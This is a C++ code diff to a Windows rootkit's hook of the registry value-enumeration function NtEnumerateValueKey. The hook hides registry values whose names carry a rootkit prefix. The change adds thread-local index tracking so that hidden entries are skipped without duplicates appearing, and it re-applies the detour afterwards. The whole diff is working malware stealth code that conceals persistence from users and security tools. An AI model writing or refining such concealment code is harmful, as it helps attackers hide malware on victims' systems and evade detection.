@@ -321,6 +321,23 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntevk(HANDLE key_handle, ULONG i
 	// RESTORE
 	detour::remove_detour(function_pointer, ntevk_og, sizeof(ntevk_og));
 
+	// we need to save indexes not to display same key twice after replacing the hidden ones
+	thread_local int last_replaced = -1;
+	thread_local HANDLE last_handle = key_handle;
+
+	// we are not iterating over a new keys list
+	if(last_handle != key_handle) {
+		last_handle  = key_handle;
+		last_replaced = -1;
+	}
+	
+	// update the index to be after the value we replaced hidden keys with
+	if(index < last_replaced)
+	{
+		index = last_replaced + 1;
+		++last_replaced;
+	}
+
 	NTSTATUS result;
 	std::wstring name;
 	while (true)
@@ -330,7 +347,11 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntevk(HANDLE key_handle, ULONG i
 
 		// something failed or we reached the end of list
 		if(!NT_SUCCESS(result))
+		{
+			// reset the index of last replaced registry value
+			last_replaced = -1;
 			break;
+		}
 
 		if (key_value_class == KEY_VALUE_INFORMATION_CLASS::KeyValueFullInformation)
 		{
@@ -347,14 +368,18 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntevk(HANDLE key_handle, ULONG i
 
 		// if nothing is found we break out of the loop
 		if (name.find(ROOTKIT_PREFIX) == std::wstring::npos)
+		{
+			// update the index of last replacement
+			last_replaced = index;
 			break;
+		}
 
 		// else clear the current held information and increase the index to check next value
 		std::memset(key_value_info, 0, length);
-		++index;
+		++index;			
 	}
 
-	// REHOOK
+	// 'REHOOK
 	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntevk));
 
 	return result;
